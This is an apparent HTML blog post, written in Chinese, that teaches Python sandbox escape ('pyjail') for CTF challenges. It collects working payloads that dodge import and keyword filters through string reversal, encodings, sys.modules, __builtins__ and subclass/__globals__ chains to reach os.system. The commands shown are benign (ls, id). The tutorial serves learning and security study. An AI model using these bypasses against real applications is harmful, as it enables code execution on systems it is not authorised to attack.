@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang=ch>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="序我认为想要学会逃逸，一定要明白代码运行过程中的整个逻辑。这样你才明白什么情况下出什么招，当然学习这个是一个漫长的时期，要沉下心来 pyJali对于pyjali，就我目前接触的题目可以分为两类，通俗来讲: 一类是通过一系列的python反射机制或者字符操作来绕过；另一类则需要你对python运行有着一定的理解才可以解决。 那我们先从简单开始，我这里想通过一个[Python 沙箱逃逸的经验总结 -">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pyjali+nodejali(一)">
+<meta property="og:url" content="https://q1ng-li.github.io/2026/03/30/blog28/index.html">
+<meta property="og:site_name" content="q1ng">
+<meta property="og:description" content="序我认为想要学会逃逸，一定要明白代码运行过程中的整个逻辑。这样你才明白什么情况下出什么招，当然学习这个是一个漫长的时期，要沉下心来 pyJali对于pyjali，就我目前接触的题目可以分为两类，通俗来讲: 一类是通过一系列的python反射机制或者字符操作来绕过；另一类则需要你对python运行有着一定的理解才可以解决。 那我们先从简单开始，我这里想通过一个[Python 沙箱逃逸的经验总结 -">
+<meta property="og:locale" content="ch_CN">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260331115205808.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260331151525090.png">
+<meta property="og:image" content="https://q1ng-li.github.io/images/image-20260331152639550.png">
+<meta property="article:published_time" content="2026-03-30T08:18:06.000Z">
+<meta property="article:modified_time" content="2026-03-31T09:24:54.704Z">
+<meta property="article:author" content="q1ng">
+<meta property="article:tag" content="沙箱逃逸">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://q1ng-li.github.io/images/image-20260331115205808.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/1.jpg">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/1.jpg" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/1.jpg">
+          
+        
+    
+    <!-- title -->
+    <title>pyjali+nodejali(一)</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+
+    
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- rss -->
+    
+    
+    <!-- jquery -->
+    
+<script src="/lib/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <div class="banner">
+<div id="blogtitel" class="blogtitel">q1ng</div>
+<ul id="wrapper" class="wrapper">
+  <div class="sun">
+    <div class="star"></div>
+  </div>
+  <div class="mercury">
+    <div class="planet">
+      <div class="shadow"></div>
+    </div>
+  </div>
+  <div class="venus">
+    <div class="planet">
+      <div class="shadow"></div>
+    </div>
+  </div>
+  <div class="earth">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+  <div class="mars">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+  <div class="jupiter">
+    <div class="planet"><div class="shadow"></div></div>
+  </div>
+</ul>
+</div>
+
+    <div class="background">
+      
+        <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/home/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/tags">Tags</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a target="_blank" rel="noopener" href="http://github.com/tzvetkov75">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2026/03/27/blog27/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://q1ng-li.github.io/2026/03/30/blog28/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://q1ng-li.github.io/2026/03/30/blog28/&text=pyjali+nodejali(一)"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://q1ng-li.github.io/2026/03/30/blog28/&title=pyjali+nodejali(一)"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://q1ng-li.github.io/2026/03/30/blog28/&is_video=false&description=pyjali+nodejali(一)"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=pyjali+nodejali(一)&body=Check out this article: https://q1ng-li.github.io/2026/03/30/blog28/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://q1ng-li.github.io/2026/03/30/blog28/&title=pyjali+nodejali(一)"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://q1ng-li.github.io/2026/03/30/blog28/&title=pyjali+nodejali(一)"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://q1ng-li.github.io/2026/03/30/blog28/&title=pyjali+nodejali(一)"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://q1ng-li.github.io/2026/03/30/blog28/&title=pyjali+nodejali(一)"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://q1ng-li.github.io/2026/03/30/blog28/&name=pyjali+nodejali(一)&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BA%8F"><span class="toc-number">1.</span> <span class="toc-text">序</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pyJali"><span class="toc-number">2.</span> <span class="toc-text">pyJali</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">2.0.1.</span> <span class="toc-text">执行命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#import%E7%BB%95%E8%BF%87"><span class="toc-number">2.0.1.1.</span> <span class="toc-text">import绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF"><span class="toc-number">2.0.1.2.</span> <span class="toc-text">字符串绕过姿势</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sys-modules"><span class="toc-number">2.0.1.3.</span> <span class="toc-text">sys.modules</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%85%E8%B0%88-builtins%E3%80%81-builtin-%E4%B8%8E-builtins"><span class="toc-number">2.0.1.4.</span> <span class="toc-text">浅谈 builtins、__builtin__与_builtins_</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF%E9%93%BE%E9%80%83%E9%80%B8"><span class="toc-number">2.0.1.5.</span> <span class="toc-text">继承链逃逸</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99"><span class="toc-number">2.0.2.</span> <span class="toc-text">文件读写</span></a></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+      
+      <div class="content index width mx-auto px2 my4">
+          
+          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        pyjali+nodejali(一)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">q1ng</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2026-03-30T08:18:06.000Z" itemprop="datePublished">2026-03-30</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" rel="tag">沙箱逃逸</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="序"><a href="#序" class="headerlink" title="序"></a>序</h1><p>我认为想要学会逃逸，一定要明白代码运行过程中的整个逻辑。这样你才明白什么情况下出什么招，当然学习这个是一个漫长的时期，要沉下心来</p>
+<h1 id="pyJali"><a href="#pyJali" class="headerlink" title="pyJali"></a>pyJali</h1><p>对于pyjali，就我目前接触的题目可以分为两类，通俗来讲: 一类是通过一系列的python反射机制或者字符操作来绕过；另一类则需要你对python运行有着一定的理解才可以解决。</p>
+<p>那我们先从简单开始，我这里想通过一个<code>[Python 沙箱逃逸的经验总结 - Tr0y&#39;s Blog](https://www.tr0y.wang/2019/05/06/Python沙箱逃逸经验总结/#利用反序列化攻击)</code>开始。既然打算开这篇文章，那么就都重新开始吧</p>
+<h3 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h3><p>对于python执行命令，有三个等级，一是任意系统命令执行、其次就是可以写入文件、最不济那就是读文件</p>
+<ul>
+<li>os </li>
+<li>exec &amp; eval  <code>eval(&#39;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#39;)</code></li>
+<li>timeit  <code>import timeit;timeit.timeit(&#39;__import__(&quot;os&quot;).system(&quot;dir&quot;)&#39;,number=1)</code></li>
+<li>commands （python2）</li>
+<li>subprocess</li>
+<li>f修饰符（python3.6+）  <code>f&#39;&#123;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#125;&#39;</code></li>
+</ul>
+<p>……</p>
+<p>大家会不会有些疑问，为什么像os这样的模块需要导入，而eval却可以直接用?</p>
+<p>原因是eval属于内置函数(存储在builtins模块),对于python启动时就会加载这些</p>
+<p>（这里有个坑，builtins模块也需要导入，毕竟python只是自动加载builtins里面的内容；对于新手，一定还分不清楚_<em>builtins</em>_,后面会解释）</p>
+<p><img src="/./images/image-20260331115205808.png" alt="image-20260331115205808"></p>
+<hr>
+<p>有了上面的基础知识，我们应该清楚，大多数可以执行系统命令的模块都需要导入即 import，如果import被ban了，该怎么操作</p>
+<h4 id="import绕过"><a href="#import绕过" class="headerlink" title="import绕过"></a>import绕过</h4><p>对于python这个神奇的语言，能够导入的不止import,还有<code>__import__</code>:<code>__import__(&#39;os&#39;)</code> ; <code>importlib</code>:<code>importlib.import_module(&#39;os&#39;).system(&#39;ls&#39;)</code>不过可惜的是importlib这个模块也需要导入。</p>
+<p>不过理解import的机制，也可以方便我们绕过。其本质就是查询字典sys.modules，看看是否导入过，有就直接拿来用。明白这个，我们就可以直接找到某个库的路径，然后手工使用execfile  (python2.x)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">execfile(&#x27;/usr/lib/python2.7/os.py&#x27;)<br>system(&#x27;ls&#x27;)<br></code></pre></td></tr></table></figure>
+
+<p>对于python3.x</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">with open(&#x27;/usr/lib/python3.10/os.py&#x27;,&#x27;r&#x27;) as f:<br>    exec(f.read())<br>system(&#x27;ls&#x27;)<br></code></pre></td></tr></table></figure>
+
+<h4 id="字符串绕过姿势"><a href="#字符串绕过姿势" class="headerlink" title="字符串绕过姿势"></a>字符串绕过姿势</h4><p>对于上面的import模块的导入，我们的目的就是要引入os模块，或者其他可以调用危险函数的模块。那么有些环境就会过滤掉os，那么对于绕过代码中对字符串的检测可谓是八仙过海，百花齐放！！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__import__(&#x27;so&#x27;[::-1]).system(&#x27;ls&#x27;)  //切片语法<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">b = &#x27;o&#x27;<br>a = &#x27;s&#x27;<br>__import__(a+b).system(&#x27;ls&#x27;)   //字符串拼接<br></code></pre></td></tr></table></figure>
+
+<p>还有eval &amp; exec函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">eval(&#x27;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#x27;[::-1])<br>exec(&#x27;)&quot;imaohw&quot;(metsys.so ;so tropmi&#x27;[::-1])<br></code></pre></td></tr></table></figure>
+
+<p>还有编码绕过比如，base64、hex、rot13</p>
+<p>python2.x的str有decode方法,python3.x不支持</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__import__(&#x27;b3M=&#x27;.decode(&#x27;base64&#x27;)).system(&#x27;id&#x27;)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__import__(&#x27;bf&#x27;.decode(&#x27;rot_13&#x27;)).system(&#x27;id&#x27;)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__import__(&#x27;6f73&#x27;.decode(&#x27;hex&#x27;)).system(&#x27;id&#x27;)<br></code></pre></td></tr></table></figure>
+
+<p>python会自动解析<code>\x</code> 开头的十六进制转义序列，以及八进制，Unicode</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__import__(&#x27;\x6f\x73&#x27;).system(&#x27;ls&#x27;)<br>__import__(&#x27;\157\163&#x27;).system(&#x27;ls&#x27;)<br>__import__(&#x27;\x6f\163&#x27;).system(&#x27;ls&#x27;)<br>__import__(&#x27;\u006f\u0073&#x27;).system(&#x27;ls&#x27;)<br></code></pre></td></tr></table></figure>
+
+<p>还可以格式化字符串(ascii码，十进制)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__import__(&#x27;%c%c&#x27;%(111, 115)).system(&#x27;id&#x27;)<br></code></pre></td></tr></table></figure>
+
+<h4 id="sys-modules"><a href="#sys-modules" class="headerlink" title="sys.modules"></a>sys.modules</h4><p>sys.modules是一个全局字典，缓存了当前Python 解释器已经加载（import）的所有模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sys.modules[&#x27;os&#x27;] = &#x27;not allowed&#x27;   #waf<br>import os<br>os.system(&#x27;ls&#x27;)<br>Traceback (most recent call last):<br>  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;<br>AttributeError: &#x27;str&#x27; object has no attribute &#x27;system&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>如何绕过，我们可以先删除 <code>del sys.modules[&#39;os&#39;]</code>,再重新利用import os 导入，此时import就会重新加载os模块或者利用默认包导入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">sys.modules[&#x27;os&#x27;]=&#x27;/usr/lib/python2.7/os.py&#x27;<br></code></pre></td></tr></table></figure>
+
+<h4 id="浅谈-builtins、-builtin-与-builtins"><a href="#浅谈-builtins、-builtin-与-builtins" class="headerlink" title="浅谈 builtins、__builtin__与_builtins_"></a>浅谈 builtins、__builtin__与_<em>builtins</em>_</h4><p>对于新手，看到这三个三胞胎一定会*&lt;&gt;*晕，今天要好好分析</p>
+<p>前面我们说了builtins模块里的内容会被python自动加载，而在python2中这个内置模块名称为_<em>builtin</em>_</p>
+<p><img src="/./images/image-20260331151525090.png" alt="image-20260331151525090"></p>
+<p>傻傻分不清的是__builtins__,这是个善变的家伙，有时候是模块，有时候是字典。__builtins__实际上是<code>__builtin__</code>和<code>builtins</code> 的引用，不过实用的是不需要导入</p>
+<p><img src="/./images/image-20260331152639550.png" alt="image-20260331152639550"></p>
+<p>这里面的好东西也不少</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__builtins__.__dict__[&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;id&#x27;)<br></code></pre></td></tr></table></figure>
+
+<p>当然这里大家也一定会有疑问为什么这里有__dict__, 有时候却exec(“__builtins__[‘__import__‘](‘os’).system(‘id’)”)也可以执行</p>
+<p>这取决于__builtins__的类型，我前面也说过__builtins__善变，如果是字典，当然可以直接利用[]取，但大多情况下__builtins__是模块(正如python2.x以及python3.x的内置模块)，x.__dict__ –&gt; 它是 x 内部所有属性名和属性值组成的字典,后续就可以像字典一样取值了</p>
+<hr>
+<h4 id="继承链逃逸"><a href="#继承链逃逸" class="headerlink" title="继承链逃逸"></a>继承链逃逸</h4><p>这个在ssti模板注入中我们很熟悉，老实说当初是只会用脚本的脚本小子，现在来理解理解其中的奥妙</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__class__指向该实例对应的类 , __bases__用来查看类的父类,__subclasses__()查看当前类的子类,.__mro__记录了继承关系<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt;&gt;&gt; class test:<br>...     pass<br>...&gt;&gt;&gt; test.__bases__<br>() # 空元组，说明没有显式继承<br></code></pre></td></tr></table></figure>
+
+<p>这里返回的是(),大家会有疑问，明明Python 3 中所有类默认继承 object，但 __bases__ 只显示显式声明的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt;&gt;&gt; class test1(object):<br>...    pass<br>...<br>&gt;&gt;&gt; test1.__bases__<br>(&lt;type &#x27;object&#x27;&gt;,)<br></code></pre></td></tr></table></figure>
+
+<p>如果我们无法自己导入os，但是某个库内部可能导入了os,那么我们就可以利用__globals__来拿到os(Python 的”标准库”包含数百个模块)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt;&gt;&gt; import site<br>&gt;&gt;&gt; site.os.system(&#x27;id&#x27;)<br>uid=1000(qing) gid=1000(qing) groups=1000(qing),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker)<br>0<br></code></pre></td></tr></table></figure>
+
+<p>在这个例子中我们似乎也能感受到一种无形的调用链，有趣。</p>
+<p>不过这里我又有一个疑问__globals__在很多ssti的payload中都会出现，可是这个到底什么作用?</p>
+<p>__globals__它是函数所在的全局命名空间中所定义的全局变量,除了一些内置函数（builtin_function_or_method，method-wrapper，wrapper_descriptor），其余函数都有这个属性，返回函数定义时所在模块的全局命名空间字典</p>
+<hr>
+<p>我们知道所有类都继承object,那么我们就查看所有子类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext"># python2.7<br>for i in enumerate(&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()): print i<br></code></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">(0, &lt;type &#x27;type&#x27;&gt;)<br>(1, &lt;type &#x27;weakref&#x27;&gt;)<br>(2, &lt;type &#x27;weakcallableproxy&#x27;&gt;)<br>(3, &lt;type &#x27;weakproxy&#x27;&gt;)<br>(4, &lt;type &#x27;int&#x27;&gt;)<br>(5, &lt;type &#x27;basestring&#x27;&gt;)<br>(6, &lt;type &#x27;bytearray&#x27;&gt;)<br>(7, &lt;type &#x27;list&#x27;&gt;)<br>(8, &lt;type &#x27;NoneType&#x27;&gt;)<br>(9, &lt;type &#x27;NotImplementedType&#x27;&gt;)<br>(10, &lt;type &#x27;traceback&#x27;&gt;)<br>(11, &lt;type &#x27;super&#x27;&gt;)<br>(12, &lt;type &#x27;xrange&#x27;&gt;)<br>(13, &lt;type &#x27;dict&#x27;&gt;)<br>(14, &lt;type &#x27;set&#x27;&gt;)<br>(15, &lt;type &#x27;slice&#x27;&gt;)<br>(16, &lt;type &#x27;staticmethod&#x27;&gt;)<br>(17, &lt;type &#x27;complex&#x27;&gt;)<br>(18, &lt;type &#x27;float&#x27;&gt;)<br>(19, &lt;type &#x27;buffer&#x27;&gt;)<br>(20, &lt;type &#x27;long&#x27;&gt;)<br>(21, &lt;type &#x27;frozenset&#x27;&gt;)<br>(22, &lt;type &#x27;property&#x27;&gt;)<br>(23, &lt;type &#x27;memoryview&#x27;&gt;)<br>(24, &lt;type &#x27;tuple&#x27;&gt;)<br>(25, &lt;type &#x27;enumerate&#x27;&gt;)<br>(26, &lt;type &#x27;reversed&#x27;&gt;)<br>(27, &lt;type &#x27;code&#x27;&gt;)<br>(28, &lt;type &#x27;frame&#x27;&gt;)<br>(29, &lt;type &#x27;builtin_function_or_method&#x27;&gt;)<br>(30, &lt;type &#x27;instancemethod&#x27;&gt;)<br>(31, &lt;type &#x27;function&#x27;&gt;)<br>(32, &lt;type &#x27;classobj&#x27;&gt;)<br>(33, &lt;type &#x27;dictproxy&#x27;&gt;)<br>(34, &lt;type &#x27;generator&#x27;&gt;)<br>(35, &lt;type &#x27;getset_descriptor&#x27;&gt;)<br>(36, &lt;type &#x27;wrapper_descriptor&#x27;&gt;)<br>(37, &lt;type &#x27;instance&#x27;&gt;)<br>(38, &lt;type &#x27;ellipsis&#x27;&gt;)<br>(39, &lt;type &#x27;member_descriptor&#x27;&gt;)<br>(40, &lt;type &#x27;file&#x27;&gt;)<br>(41, &lt;type &#x27;PyCapsule&#x27;&gt;)<br>(42, &lt;type &#x27;cell&#x27;&gt;)<br>(43, &lt;type &#x27;callable-iterator&#x27;&gt;)<br>(44, &lt;type &#x27;iterator&#x27;&gt;)<br>(45, &lt;type &#x27;sys.long_info&#x27;&gt;)<br>(46, &lt;type &#x27;sys.float_info&#x27;&gt;)<br>(47, &lt;type &#x27;EncodingMap&#x27;&gt;)<br>(48, &lt;type &#x27;fieldnameiterator&#x27;&gt;)<br>(49, &lt;type &#x27;formatteriterator&#x27;&gt;)<br>(50, &lt;type &#x27;sys.version_info&#x27;&gt;)<br>(51, &lt;type &#x27;sys.flags&#x27;&gt;)<br>(52, &lt;type &#x27;exceptions.BaseException&#x27;&gt;)<br>(53, &lt;type &#x27;module&#x27;&gt;)<br>(54, &lt;type &#x27;imp.NullImporter&#x27;&gt;)<br>(55, &lt;type &#x27;zipimport.zipimporter&#x27;&gt;)<br>(56, &lt;type &#x27;posix.stat_result&#x27;&gt;)<br>(57, &lt;type &#x27;posix.statvfs_result&#x27;&gt;)<br>(58, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;)<br>(59, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;)<br>(60, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;)<br>(61, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;)<br>(62, &lt;class &#x27;_abcoll.Hashable&#x27;&gt;)<br>(63, &lt;type &#x27;classmethod&#x27;&gt;)<br>(64, &lt;class &#x27;_abcoll.Iterable&#x27;&gt;)<br>(65, &lt;class &#x27;_abcoll.Sized&#x27;&gt;)<br>(66, &lt;class &#x27;_abcoll.Container&#x27;&gt;)<br>(67, &lt;class &#x27;_abcoll.Callable&#x27;&gt;)<br>(68, &lt;type &#x27;dict_keys&#x27;&gt;)<br>(69, &lt;type &#x27;dict_items&#x27;&gt;)<br>(70, &lt;type &#x27;dict_values&#x27;&gt;)<br>(71, &lt;class &#x27;site._Printer&#x27;&gt;)<br>(72, &lt;class &#x27;site._Helper&#x27;&gt;)<br>(73, &lt;type &#x27;_sre.SRE_Pattern&#x27;&gt;)<br>(74, &lt;type &#x27;_sre.SRE_Match&#x27;&gt;)<br>(75, &lt;type &#x27;_sre.SRE_Scanner&#x27;&gt;)<br>(76, &lt;class &#x27;site.Quitter&#x27;&gt;)<br>(77, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;)<br>(78, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;)<br>(79, &lt;type &#x27;Struct&#x27;&gt;)<br>(80, &lt;class &#x27;string.Template&#x27;&gt;)<br>(81, &lt;class &#x27;string.Formatter&#x27;&gt;)<br>(82, &lt;class &#x27;__main__.test1&#x27;&gt;)<br></code></pre></td></tr></table></figure>
+
+<p>可以看到索引71 site._Printer，是site库中的一个内部类 ,我们就以这个为例，拿到os(py3.x 中已经移除了这里 <code>__globals__</code> 的 os)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;]<br>&lt;module &#x27;os&#x27; from &#x27;/usr/lib/python2.7/os.pyc&#x27;&gt;<br></code></pre></td></tr></table></figure>
+
